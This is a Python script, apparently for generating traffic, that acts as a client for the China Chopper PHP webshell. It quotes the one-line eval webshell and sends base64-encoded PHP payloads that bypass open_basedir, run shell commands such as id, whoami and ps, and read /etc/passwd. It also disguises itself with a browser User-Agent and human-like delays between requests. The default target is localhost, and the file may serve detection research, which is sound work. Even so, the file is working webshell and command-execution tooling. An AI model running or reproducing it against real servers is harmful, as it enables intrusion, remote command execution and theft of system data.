#!/usr/bin/env python3
"""China Chopper (菜刀) webshell protocol driver.

Replicates the classic one-line PHP webshell client traffic:
  POST /shell.php
  Content-Type: application/x-www-form-urlencoded
  body: z0=<urlencoded base64(PHP eval payload)>&z1=<urlencoded argument>

The PHP shell is:
    <?php @eval(base64_decode($_POST['z0']));?>

Each operation opens its own short-lived connection (Connection: close),
no keep-alive, no heartbeat -- the classic chopper "operation per connection"
pattern. Request size is 300-2500B, response carries the command output
between "->|" and "|<-" markers.
"""

import base64
import os
import sys
import time
import urllib.parse
import urllib.request

PREFIX = (
    '@ini_set("display_errors","0");@set_time_limit(0);'
    '@$opdir=@ini_get("open_basedir");'
    'if($opdir){$oparr=explode(";",$opdir);$dp=0;'
    'foreach($oparr as $k=>$v){$t=realpath($v);if($t){$dp=$t;break;}}'
    'if(!$dp){echo "->|open_basedir:".$opdir."|<-";exit;}'
    'chdir($dp);ini_set("open_basedir","..");'
    'ini_set("open_basedir","/");}'
    'else{chdir("/");}'
)

URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/shell.php"
OPS = [
    # (label, PHP template, z1 argument or None)
    ("pwd",
     'echo "->|";echo getcwd();echo "|<-";',
     None),
    ("file_list",
     '$p=$_POST[\'z1\'];echo "->|";if(is_dir($p)){foreach(scandir($p) as $f){echo $f."\\n";}}echo "|<-";',
     "/tmp"),
    ("exec_id",
     '$c=$_POST[\'z1\'];echo "->|";system($c);echo "|<-";',
     "id"),
    ("read_passwd",
     '$f=$_POST[\'z1\'];echo "->|";echo file_get_contents($f);echo "|<-";',
     "/etc/passwd"),
    ("exec_whoami",
     '$c=$_POST[\'z1\'];echo "->|";system($c);echo "|<-";',
     "whoami"),
    ("file_list2",
     '$p=$_POST[\'z1\'];echo "->|";if(is_dir($p)){foreach(scandir($p) as $f){echo $f."\\n";}}echo "|<-";',
     "/etc"),
    ("exec_uname",
     '$c=$_POST[\'z1\'];echo "->|";system($c);echo "|<-";',
     "uname -a"),
    ("exec_ls",
     '$c=$_POST[\'z1\'];echo "->|";system($c);echo "|<-";',
     "ls -la /tmp"),
    ("read_hostname",
     '$f=$_POST[\'z1\'];echo "->|";echo file_get_contents($f);echo "|<-";',
     "/etc/hostname"),
    ("exec_ps",
     '$c=$_POST[\'z1\'];echo "->|";system($c);echo "|<-";',
     "ps aux | head -5"),
]


def run_one(label, php, arg):
    z0 = base64.b64encode((PREFIX + php).encode()).decode()
    fields = [("z0", z0)]
    if arg is not None:
        fields.append(("z1", arg))
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        URL, data=body, method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
            "Connection": "close",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = r.read()
            print(f"[ok] {label}: req={len(body)}B resp={len(data)}B")
    except Exception as e:  # noqa: BLE001
        print(f"[fail] {label}: {e}", file=sys.stderr)


def main():
    print(f"chopper driver -> {URL}")
    for i, (label, php, arg) in enumerate(OPS):
        run_one(label, php, arg)
        if i < len(OPS) - 1:
            time.sleep(1 + (i % 3))  # 1-3s human-ish operation rhythm


if __name__ == "__main__":
    main()
